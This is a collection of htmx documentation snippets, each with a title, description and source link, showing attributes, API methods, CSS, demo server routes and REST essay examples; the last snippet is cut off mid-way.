javascript\nCODE:\n```\n\tonGet(\"/tab1\", function() {\n\t\treturn `\n\t\t<div class=\"tab-list\" role=\"tablist\">\n\t\t\t<button hx-get=\"/tab1\" class=\"selected\" aria-selected=\"true\" autofocus role=\"tab\" aria-controls=\"tab-content\">Tab 1</button>\n\t\t\t<button hx-get=\"/tab2\" role=\"tab\" aria-selected=\"false\" aria-controls=\"tab-content\">Tab 2</button>\n\t\t\t<button hx-get=\"/tab3\" role=\"tab\" aria-selected=\"false\" aria-controls=\"tab-content\">Tab 3</button>\n\t\t</div>\n\n\t\t<div id=\"tab-content\" role=\"tabpanel\" class=\"tab-content\">\n\t\t\tCommodo normcore truffaut VHS duis gluten-free keffiyeh iPhone taxidermy godard ramps anim pour-over.\n\t\t\tPitchfork vegan mollit umami quinoa aute aliquip kinfolk eiusmod live-edge cardigan ipsum locavore.\n\t\t\tPolaroid duis occaecat narwhal small batch food truck.\n\t\t\tPBR&B venmo shaman small batch you probably haven't heard of them hot chicken readymade.\n\t\t\tEnim tousled cliche woke, typewriter single-origin coffee hella culpa.\n\t\t\tArt party readymade 90's, asymmetrical hell of fingerstache ipsum.\n\t\t</div>`\n\t})\n\n\tonGet(\"/tab2\", function() {\n\t\treturn `\n\t\t<div class=\"tab-list\" role=\"tablist\">\n\t\t\t<button hx-get=\"/tab1\" role=\"tab\" aria-selected=\"false\" aria-controls=\"tab-content\">Tab 1</button>\n\t\t\t<button hx-get=\"/tab2\" class=\"selected\" aria-selected=\"true\" autofocus role=\"tab\" aria-controls=\"tab-content\">Tab 2</button>\n\t\t\t<button hx-get=\"/tab3\" role=\"tab\" aria-selected=\"false\" aria-controls=\"tab-content\">Tab 3</button>\n\t\t</div>\n\n\t\t<div id=\"tab-content\" role=\"tabpanel\" class=\"tab-content\">\n\t\t\tKitsch fanny pack yr, farm-to-table cardigan cillum commodo reprehenderit plaid dolore cronut meditation.\n\t\t\tTattooed polaroid veniam, anim id cornhole hashtag sed forage.\n\t\t\tMicrodosing pug kitsch enim, kombucha pour-over sed irony forage live-edge.\n\t\t\tVexillologist eu nulla trust fund, street art blue bottle selvage raw denim.\n\t\t\tDolore nulla do readymade, est subway tile affogato hammock 8-bit.\n\t\t\tGodard elit offal pariatur you probably haven't heard of them post-ironic.\n\t\t\tPrism street art cray salvia.\n\t\t</div>`\n\t})\n\n\tonGet(\"/tab3\", function() {\n\t\treturn `\n\t\t<div class=\"tab-list\" role=\"tablist\">\n\t\t\t<button hx-get=\"/tab1\" role=\"tab\" aria-selected=\"false\" aria-controls=\"tab-content\">Tab 1</button>\n\t\t\t<button hx-get=\"/tab2\" role=\"tab\" aria-selected=\"false\" aria-controls=\"tab-content\">Tab 2</button>\n\t\t\t<button hx-get=\"/tab3\" class=\"selected\" aria-selected=\"true\" autofocus role=\"tab\" aria-controls=\"tab-content\">Tab 3</button>\n\t\t</div>\n\n\t\t<div id=\"tab-content\" role=\"tabpanel\" class=\"tab-content\">\n\t\t\tAute chia marfa echo park tote bag hammock mollit artisan listicle direct trade.\n\t\t\tRaw denim flexitarian eu godard etsy.\n\t\t\tPoke tbh la croix put a bird on it fixie polaroid aute cred air plant four loko gastropub swag non brunch.\n\t\t\tIceland fanny pack tumeric magna activated charcoal bitters palo santo laboris quis consectetur cupidatat portland aliquip venmo.\n\t\t</div>`\n\t})\n\n```\n\n----------------------------------------\n\nTITLE: Inherited hx-include with find selector in htmx\nDESCRIPTION: This example demonstrates how `hx-include` is inherited and how the `find` selector works.  The `hx-include` is placed on the div, but the `find input` selector is resolved from the button, which does not have any `input` child, and therefore no element is included.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-include.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div hx-include=\"find input\">\n    <button hx-post=\"/register\">\n        Register!\n    </button>\n    Enter email: <input name=\"email\" type=\"email\"/>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Creating JSON Data API Controller in Flask\nDESCRIPTION: This Python code snippet shows a Flask controller method for creating a JSON API endpoint that returns a paginated list of contacts. It fetches the page number from the request arguments, retrieves the contacts using the `Contact` model, and returns the contacts as a JSON response using the `jsonify` function. The snippet depends on the Flask framework and a `Contact` model.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/mvc.md#_snippet_1\n\nLANGUAGE: Python\nCODE:\n```\n@app.route(\"/api/v1/contacts\")\ndef contacts():\n    contacts = Contact.all(page=request.args.get('page', default=0, type=int))\n    return jsonify(contacts=contacts)\n```\n\n----------------------------------------\n\nTITLE: Styling htmx-indicator with CSS\nDESCRIPTION: This CSS snippet defines styles for the `htmx-indicator` class.  Initially, the indicator has an opacity of 0. When the `htmx-request` class is added to the element (or a parent), the opacity changes to 1, making the indicator visible with a transition effect.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-indicator.md#_snippet_1\n\nLANGUAGE: CSS\nCODE:\n```\n    .htmx-indicator{\n        opacity:0;\n        transition: opacity 500ms ease-in;\n    }\n    .htmx-request .htmx-indicator{\n        opacity:1;\n    }\n    .htmx-request.htmx-indicator{\n        opacity:1;\n    }\n```\n\n----------------------------------------\n\nTITLE: Calling a Trusted Route with htmx in HTML\nDESCRIPTION: This HTML snippet demonstrates calling a trusted route using htmx's `hx-get` attribute. It triggers a GET request to the `/events` endpoint when the button is clicked, ensuring the application only interacts with controlled routes.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<button hx-get=\"/events\">Search events</button>\n```\n\n----------------------------------------\n\nTITLE: Processing New Content with htmx (JavaScript)\nDESCRIPTION: This snippet demonstrates how to process new content and enable htmx behavior using the `htmx.process()` method. This is useful when content is added to the DOM outside of the standard htmx request cycle, but you want the htmx attributes to be functional.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_16\n\nLANGUAGE: javascript\nCODE:\n```\ndocument.body.innerHTML = \"<div hx-get='/example'>Get it!</div>\"\n// process the newly added content\nhtmx.process(document.body);\n```\n\n----------------------------------------\n\nTITLE: Completed Progress Bar - HTML\nDESCRIPTION: This HTML snippet represents the progress bar's completed state. The `hx-trigger` attribute is set to \"done\", which is triggered by the `HX-Trigger` header from the server. The element is updated with a 'Restart Job' button. The CSS class `show` is added to the button after a delay to create a fade-in effect.  This relies on the `class-tools` htmx extension.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/progress-bar.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<div hx-trigger=\"done\" hx-get=\"/job\" hx-swap=\"outerHTML\" hx-target=\"this\">\n  <h3 role=\"status\" id=\"pblabel\" tabindex=\"-1\" autofocus>Complete</h3>\n\n  <div\n    hx-get=\"/job/progress\"\n    hx-trigger=\"none\"\n    hx-target=\"this\"\n    hx-swap=\"innerHTML\">\n      <div class=\"progress\" role=\"progressbar\" aria-valuemin=\"0\" aria-valuemax=\"100\" aria-valuenow=\"122\" aria-labelledby=\"pblabel\">\n        <div id=\"pb\" class=\"progress-bar\" style=\"width:122%\">\n      </div>\n    </div>\n  </div>\n\n  <button id=\"restart-btn\" class=\"btn primary\" hx-post=\"/start\" classes=\"add show:600ms\">\n    Restart Job\n  </button>\n</div>\n```\n\n----------------------------------------\n\nTITLE: CSS Transition for Fading In Image\nDESCRIPTION: These CSS rules define a transition effect for fading in the image after it has loaded. The .htmx-settling class, which is added by htmx during the settling process, initially sets the opacity to 0. The img selector then defines a transition that gradually increases the opacity over 300ms.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/lazy-load.md#_snippet_1\n\nLANGUAGE: css\nCODE:\n```\n.htmx-settling img {\n  opacity: 0;\n}\nimg {\n transition: opacity 300ms ease-in;\n}\n```\n\n----------------------------------------\n\nTITLE: hx-swap-oob with template and tr HTML\nDESCRIPTION: This example demonstrates the use of a `<template>` tag to encapsulate a table row (`<tr>`) for out-of-band swapping.  The `<tr>` has `hx-swap-oob=\"true\"` and will replace the element with the id `row`. The template tag will be removed after swap.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap-oob.md#_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<div>\n    ...\n</div>\n<template>\n    <tr id=\"row\" hx-swap-oob=\"true\">\n        ...\n    </tr>\n</template>\n```\n\n----------------------------------------\n\nTITLE: Installing htmx WebSockets extension via npm\nDESCRIPTION: This snippet shows how to install the `htmx-ext-ws` extension using npm. After installing, you'll need to bundle the extension with htmx core and project-specific code. This assumes you are using a bundler such as Webpack or Rollup.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/ws.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nnpm install htmx-ext-ws\n```\n\n----------------------------------------\n\nTITLE: Converting hx-on attributes to hx-on:\nDESCRIPTION: Demonstrates the syntax change for event handling in htmx 2.x. The `hx-on` attribute is replaced with `hx-on:` followed by the kebab-case version of the event name. This example shows a button with event listeners for `htmx:beforeRequest` and `htmx:afterRequest`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-htmx-1.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n     <button hx-get=\"/info\" hx-on=\"htmx:beforeRequest: alert('Making a request!')\n                                   htmx:afterRequest: alert('Done making a request!')\">\n      Get Info!\n     </button>\n```\n\nLANGUAGE: HTML\nCODE:\n```\n     <button hx-get=\"/info\" hx-on:htmx:before-request=\"alert('Making a request!')\"\n                            hx-on:htmx:after-request=\"alert('Done making a request!')\">\n      Get Info!\n     </button>\n```\n\n----------------------------------------\n\nTITLE: Implementing AJAX Request with htmx\nDESCRIPTION: This code snippet demonstrates an AJAX request implementation using htmx. The `hx-get` attribute on the button element specifies the URL to which the request is sent when the button is clicked. The behavior of the button is immediately obvious upon inspection, exemplifying good Locality of Behaviour (LoB).\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/locality-of-behaviour.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<button hx-get=\"/clicked\">Click Me</button>\n```\n\n----------------------------------------\n\nTITLE: Polling with hx-get and hx-trigger\nDESCRIPTION: This snippet demonstrates implementing polling by triggering a load on a schedule with `hx-get` and `hx-trigger`. The element will fetch content from the specified URL every 2 seconds. Requires the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_10\n\nLANGUAGE: html\nCODE:\n```\n<div hx-get=\"/news\" hx-trigger=\"every 2s\"></div>\n```\n\n----------------------------------------\n\nTITLE: Disabling Logging of htmx Events (JavaScript)\nDESCRIPTION: This snippet demonstrates how to disable htmx event logging using the `htmx.logNone()` method. This is useful for turning off the debugger if it was previously enabled by `htmx.logAll()`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\nhtmx.logNone();\n```\n\n----------------------------------------\n\nTITLE: Disabling All Attribute Inheritance with hx-disinherit=\"*\"\nDESCRIPTION: This snippet demonstrates disabling all attribute inheritance for child elements within a div. The hx-disinherit=\"*\" attribute on the parent div prevents child elements from inheriting any htmx attributes such as hx-boost, hx-select, and hx-target.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-disinherit.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-boost=\"true\" hx-select=\"#content\" hx-target=\"#content\" hx-disinherit=\"*\">\n  <a href=\"/page1\">Go To Page 1</a> <!-- boosted with the attribute settings above -->\n  <a href=\"/page2\" hx-boost=\"unset\">Go To Page 1</a> <!-- not boosted -->\n  <button hx-get=\"/test\" hx-target=\"this\"></button> <!-- hx-select is not inherited -->\n</div>\n```\n\n----------------------------------------\n\nTITLE: hx-swap-oob with table HTML\nDESCRIPTION: This example shows how to use `hx-swap-oob` to insert a table row (`<tr>`) into a 'plain' table. The `<tr>` is encapsulated within a `<table>` tag that specifies the target element with `beforeend:#table2`. The encapsulating `<table>` tag will be stripped during the swap.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap-oob.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<table hx-swap-oob=\"beforeend:#table2\">\n\t<tr>\n\t\t...\n\t</tr>\n</table>\n```\n\n----------------------------------------\n\nTITLE: Displaying User Favorite Image\nDESCRIPTION: This code snippet demonstrates how to display a user's favorite image, assuming the user can provide a URL.  It highlights the security risks associated with allowing users to submit arbitrary URLs, as the \"escape everything\" approach can break the URL by escaping forward slashes.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_15\n\nLANGUAGE: HTML\nCODE:\n```\n<img src=\"{{ user.fav_img }}\">\n```\n\n----------------------------------------\n\nTITLE: Fake Server-Side Logic (JavaScript)\nDESCRIPTION: This JavaScript code simulates the server-side logic for handling the htmx requests. It defines routes for initializing the form and handling the '/models' endpoint, returning appropriate model options based on the selected make. It also includes a data store to mock the database.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/value-select.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n<script>\n\n    //=========================================================================\n    // Fake Server Side Code\n    //=========================================================================\n\n    // routes\n    init(\"/demo\", function(request, params){\n      return formTemplate();\n    });\n    \n    onGet(/models.*/, function (request, params) {\n        var make = dataStore.findMake(params['make']);\n        return modelOptionsTemplate(make['models']);\n    });\n    \n    // templates\n    function formTemplate() {\n      return `  <h3>Pick A Make/Model</h3>              \n<form>\n  <div>\n    <label >Make</label>\n    <select name=\"make\" hx-get=\"/models\" hx-target=\"#models\" hx-indicator=\".htmx-indicator\">\n      <option value=\"audi\">Audi</option>\n      <option value=\"toyota\">Toyota</option>\n      <option value=\"bmw\">BMW</option>\n    </select>\n  </div>\n  <div>\n    <label>Model</label>\n    <select id=\"models\" name=\"model\">\n      <option value=\"a1\">A1</option>\n      <option value=\"a3\">A3</option>\n      <option value=\"a6\">A6</option>\n    </select>\n    <img class=\"htmx-indicator\" width=\"20\" src=\"/img/bars.svg\">    \n  </div>\n</form>`;\n    }\n\n    function modelOptionsTemplate(make) {\n      return make.map(function(val) {\n        return \"<option value='\" + val + \"'>\" + val +\"</option>\";\n      }).join(\"\\n\");\n    }\n\n    var dataStore = function(){\n      var data = {\n        audi : { models : [\"A1\", \"A4\", \"A6\"] },\n        toyota : { models : [\"Landcruiser\", \"Tacoma\", \"Yaris\"] },\n        bmw : { models : [\"325i\", \"325ix\", \"X5\"] }\n      };\n      return {\n        findMake : function(make) {\n          return data[make];\n        }\n      }\n    }()\n</script>\n```\n\n----------------------------------------\n\nTITLE: Simulated Server-Side Routes\nDESCRIPTION: This JavaScript code simulates server-side routes using `init` and `onGet` functions, which are likely placeholders for a real server-side framework. The routes handle requests for the initial page and subsequent contact data pages.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/click-to-load.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n    init(\"/demo\", function(request, params){\n        var contacts = dataStore.contactsForPage(1)\n        return tableTemplate(contacts)\n    });\n\n    onGet(/\\/contacts.*/, function(request, params){\n        var page = parseInt(params['page']);\n        var contacts = dataStore.contactsForPage(page)\n        return rowsTemplate(page, contacts);\n    });\n```\n\n----------------------------------------\n\nTITLE: Toggling a Class on an Element with htmx (JavaScript)\nDESCRIPTION: This snippet demonstrates how to toggle a class on an element using the `htmx.toggleClass()` method. The method takes the element and the class to toggle as parameters. Toggling means adding the class if it's not present, or removing it if it is.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_22\n\nLANGUAGE: javascript\nCODE:\n```\n// toggles the selected class on tab2\nhtmx.toggleClass(htmx.find(\"#tab2\"), \"selected\");\n```\n\n----------------------------------------\n\nTITLE: Displaying User Input - HTML\nDESCRIPTION: This HTML snippet shows how to display the user's input from the prompt dialog. The `response` variable is dynamically injected to display the value provided by the user.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/dialogs.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\nUser entered <i>${response}</i>\n```\n\n----------------------------------------\n\nTITLE: JSON Configuring htmx to Swap All Responses\nDESCRIPTION: Shows how to configure htmx to swap all responses regardless of the HTTP status code, overriding the default behavior. This is done via the `htmx.config.responseHandling` configuration.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/QUIRKS.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"responseHandling\": [\n    {\"code\":\"...\", \"swap\": true}]\n}\n```\n\n----------------------------------------\n\nTITLE: JSON Example: Contact Information\nDESCRIPTION: This JSON snippet represents contact information (name and email).  Unlike the HTML example, it requires the client to have prior knowledge of how to render the data and which actions are available for manipulation.  It highlights the difference between RESTful hypermedia and traditional client-server systems.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/rest-explained.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n    {\n      \"name\" : \"Joe Blow\",\n      \"email\" : \"joe@example.com\"\n    }\n```\n\n----------------------------------------\n\nTITLE: Displaying and Hiding Site List with htmx\nDESCRIPTION: This HTML snippet uses htmx to show or hide the list of sites in the webring and to transition between the site list and the webring iframe. It also includes tiny-directives for handling the animation and visibility of elements when the links are clicked.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/webring.md#_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n<a href=\"#\" id=\"show-sites\"\n        _=\"on click \n             transition the #webring's opacity to 0\n             hide the #webring\n             transition #site-table's height to 100% over 300ms then \n             hide me then\n             show #return-to-webring\">List Sites</a><a href=\"#\" id=\"return-to-webring\"\n        style=\"display: none\"\n        _=\"on click \n             transition #site-table's height to 0px over 800ms then\n             show the #webring\n             transition the #webring's opacity to 100%\n             hide me then\n             show #show-sites\">Return To Webring</a>\n```\n\n----------------------------------------\n\nTITLE: Embedding YouTube Video with hx-preserve Attribute\nDESCRIPTION: This code snippet embeds a YouTube video within a figure element. The `hx-preserve=\"true\"` attribute on the `iframe` tag ensures that the video continues to play even when the element is moved within the DOM by HTMX.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/move-before/details.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<figure>\n  <iframe hx-preserve=\"true\" id=\"rick-roll\" width=\"617\" height=\"351\" src=\"https://www.youtube.com/embed/dQw4w9WgXcQ\" \n          title=\"Rick Astley - Never Gonna Give You Up (Official Music Video)\" frameborder=\"0\" \n          allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" \n          referrerpolicy=\"strict-origin-when-cross-origin\" allowfullscreen></iframe>\n<figcaption>A Classic Rick Roll</figcaption>\n</figure>\n```\n\n----------------------------------------\n\nTITLE: Simplified HTML Example: Contact Actions\nDESCRIPTION: This simplified HTML example showcases a contact's name, email, and associated actions (edit, email, archive) via anchor tags. It further emphasizes the core principle of hypermedia where the possible state transitions are explicitly encoded as URLs within the resource's representation.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/rest-explained.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<html>\n  <body>\n  <div>\n    <div>\n      Name: Joe Blow\n    </div>\n    <div>\n      Email: joe@blow.com\n    </div>\n    <div>\n      <a href=\"/contacts/42/edit\">Edit</a>\n      <a href=\"/contacts/42/email\">Email</a>\n      <a href=\"/contacts/42/archive</a>\n    </div>\n  </div>\n</body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Using hx-indicator with CSS selector (HTML)\nDESCRIPTION: This HTML snippet demonstrates how to use the `hx-indicator` attribute to target a specific element (with the ID `spinner`) to display a loading indicator during an htmx POST request. The indicator is an image with the class `htmx-indicator`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-indicator.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<div>\n    <button hx-post=\"/example\" hx-indicator=\"#spinner\">\n        Post It!\n    </button>\n    <img  id=\"spinner\" class=\"htmx-indicator\" src=\"/img/bars.svg\"/>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Simple HX-Location Header Example\nDESCRIPTION: This code snippet demonstrates a basic HX-Location response header, which triggers a client-side redirect to the specified path as if the user had clicked on an hx-boost link. This creates a new history entry and performs an AJAX request to the provided URL.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/headers/hx-location.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\nHX-Location: /test\n```\n\n----------------------------------------\n\nTITLE: Removing a Class from an Element with htmx (JavaScript)\nDESCRIPTION: This snippet demonstrates how to remove a class from an element using the `htmx.removeClass()` method.  It can take the element and class to remove, or the element, class, and a delay in milliseconds before removal. The examples show removing a class immediately and after a 6-second delay.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_18\n\nLANGUAGE: javascript\nCODE:\n```\n// removes .myClass from my-div\nhtmx.removeClass(htmx.find(\"#my-div\"), \"myClass\");\n\n// removes .myClass from my-div after 6 seconds\nhtmx.removeClass(htmx.find(\"#my-div\"), \"myClass\", 6000);\n```\n\n----------------------------------------\n\nTITLE: Including Content with hx-include\nDESCRIPTION: This snippet shows how to include data from other elements when making a request using htmx's `hx-include`. It includes the value of the specified element in the request. Requires the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_6\n\nLANGUAGE: html\nCODE:\n```\nhx-include\n```\n\n----------------------------------------\n\nTITLE: Specifying Swap Strategy with hx-select-oob\nDESCRIPTION: This HTML snippet illustrates how to specify a swap strategy for the `hx-select-oob` attribute. Here, the swap strategy `afterbegin` is used to prepend the content of the element with id `alert` from the server response into the element with the same ID in the DOM. The `hx-select` picks out the element with the id `info-details` to replace the button element. The swap strategy is separated by `:` from the selector.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-select-oob.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div>\n   <div id=\"alert\"></div>\n    <button hx-get=\"/info\"\n            hx-select=\"#info-details\"\n            hx-swap=\"outerHTML\"\n            hx-select-oob=\"#alert:afterbegin\">\n        Get Info!\n    </button>\n</div>\n```\n\n----------------------------------------\n\nTITLE: HTML Response Example\nDESCRIPTION: This HTML snippet demonstrates a RESTful API response for a bank account.  It includes links to related resources (deposits, withdrawals, transfers, close-requests), allowing the client to discover available actions. The client interacts with the API based on the provided hypermedia, embodying the HATEOAS principle.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/how-did-rest-come-to-mean-the-opposite-of-rest.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\nHTTP/1.1 200 OK\n\n<html>\n    <body>\n        <div>Account number: 12345</div>\n        <div>Balance: $100.00 USD</div>\n        <div>Links:\n            <a href=\"/accounts/12345/deposits\">deposits</a>\n            <a href=\"/accounts/12345/withdrawals\">withdrawals</a>\n            <a href=\"/accounts/12345/transfers\">transfers</a>\n            <a href=\"/accounts/12345/close-requests\">close-requests</a>\n        </div>\n    <body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Hypermedia API Response Example\nDESCRIPTION: This HTML snippet shows a hypermedia API response, representing account information with embedded links for further actions. It includes the account number, balance, and links to related resources such as deposits, withdrawals, and transfers. This approach facilitates network architecture-level decoupling.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/two-approaches-to-decoupling.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<html>\n  <body>\n    <div>Account number: 12345</div>\n    <div>Balance: $100.00 USD</div>\n    <div>Links:\n        <a href=\"/accounts/12345/deposits\">deposits</a>\n        <a href=\"/accounts/12345/withdrawals\">withdrawals</a>\n        <a href=\"/accounts/12345/transfers\">transfers</a>\n        <a href=\"/accounts/12345/close-requests\">close-requests</a>\n    </div>\n  <body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: GET Request to Render Form and Contacts Table\nDESCRIPTION: This snippet represents a GET request to the `/contacts` endpoint, which is expected to return the HTML for a form to add new contacts and a table displaying the current contacts. This endpoint is fundamental for the initial rendering of the page.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hypermedia-apis-vs-data-apis.md#_snippet_0\n\nLANGUAGE: txt\nCODE:\n```\n  GET /contacts -> render the form & contacts table\n```\n\n----------------------------------------\n\nTITLE: Implementing Dependencies with hx-trigger and path-deps\nDESCRIPTION: This snippet shows how to implement dependency management similar to Intercooler's `ic-deps` using htmx's `hx-trigger` and the `path-deps` extension. The element will trigger an update when the specified path changes. Requires the htmx library and `path-deps` extension.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_3\n\nLANGUAGE: html\nCODE:\n```\nhx-trigger=\"path-deps\" along with path-deps=\"/foo/bar\"\n```\n\n----------------------------------------\n\nTITLE: HTML Form and Contacts Table\nDESCRIPTION: This HTML snippet presents a form for adding contacts and a table to display the current list of contacts. It demonstrates a typical structure for a web page where users can input data and view existing data.  The form submits to `/contacts` via POST.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hypermedia-apis-vs-data-apis.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<div>\n    <form action='/contacts' method=\"post\">\n      <!-- form for adding contacts -->\n    </form>\n    <table>\n      <!-- contacts table -->\n    </table>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Lazy Loading HTML Element with htmx\nDESCRIPTION: This HTML snippet defines a div that will lazily load content from the /graph endpoint when it is loaded into the DOM. It uses hx-get to specify the URL to fetch content from and hx-trigger=\"load\" to trigger the request upon load. An img element serves as a loading indicator while the content is being fetched.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/lazy-load.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div hx-get=\"/graph\" hx-trigger=\"load\">\n  <img alt=\"Result loading...\" class=\"htmx-indicator\" width=\"150\" src=\"/img/bars.svg\"/>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Setting Style with Hyperscript in htmx\nDESCRIPTION: This snippet demonstrates using hyperscript to set the color style of all buttons on a click event. It showcases the `target` expression in hyperscript and how it can manipulate other elements. It depends on hyperscript library being included in the project.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div _=\"on click set .button.style.color to 'red'\">Set All Buttons To Red</div>\n```\n\n----------------------------------------\n\nTITLE: CSS Animation - Color Throb with htmx\nDESCRIPTION: This snippet demonstrates a simple color throbbing animation using CSS transitions and htmx.  The `color` style of a div with a stable `id` is updated periodically, triggering a CSS transition defined on the `.smooth` class to smoothly change the color.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<style>\n.smooth {\n  transition: all 1s ease-in;\n}\n</style>\n<div id=\"color-demo\" class=\"smooth\" style=\"color:red\"\n      hx-get=\"/colors\" hx-swap=\"outerHTML\" hx-trigger=\"every 1s\">\n  Color Swap Demo\n</div>\n```\n\nLANGUAGE: html\nCODE:\n```\n<div id=\"color-demo\" class=\"smooth\" style=\"color:blue\"\n      hx-get=\"/colors\" hx-swap=\"outerHTML\" hx-trigger=\"every 1s\">\n  Color Swap Demo\n</div>\n```\n\n----------------------------------------\n\nTITLE: hx-swap with show:none to disable scroll on boosted forms\nDESCRIPTION: This snippet demonstrates how to disable the default scroll-to-top behavior for boosted forms by using `hx-swap=\"show:none\"`. This prevents the page from automatically scrolling to the top after the form submission.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap.md#_snippet_7\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"/example\" hx-swap=\"show:none\">\n  ...\n</form>\n```\n\n----------------------------------------\n\nTITLE: Defining Web Component with HTMX Integration in JS\nDESCRIPTION: Defines a custom web component (`my-component`) using `customElements.define`. Inside the `connectedCallback`, a shadow DOM is attached, and HTML content with HTMX attributes (`hx-get`, `hx-target`) is added.  `htmx.process(root)` is called to inform HTMX about the shadow DOM, enabling HTMX to work within the component. The mode is set to 'closed' which means that the shadow DOM is not accessible from JavaScript outside the component.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/web-components.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\ncustomElements.define('my-component', class MyComponent extends HTMLElement {\n  // This method runs when your custom element is added to the page\n  connectedCallback() {\n    const root = this.attachShadow({ mode: 'closed' })\n    root.innerHTML = `\n      <button hx-get=\"/my-component-clicked\" hx-target=\"next div\">Click me!</button>\n      <div></div>\n    `\n    htmx.process(root) // Tell HTMX about this component's shadow DOM\n  }\n})\n```\n\n----------------------------------------\n\nTITLE: Expanding Target with hx-target - htmx\nDESCRIPTION: This HTML snippet demonstrates the \"expanding the target\" approach. A div with the ID `table-and-form` wraps both the table and the form. The `hx-target` attribute on the form is set to `#table-and-form`, causing the entire div to be replaced with the response from the `/contacts` endpoint.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/update-other-content.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div id=\"table-and-form\">\n    <h2>Contacts</h2>\n    <table class=\"table\">\n      <thead>\n        <tr>\n          <th>Name</th>\n          <th>Email</th>\n          <th></th>\n        </tr>\n      </thead>\n      <tbody id=\"contacts-table\">\n        ...\n      </tbody>\n    </table>\n    <h2>Add A Contact</h2>\n    <form 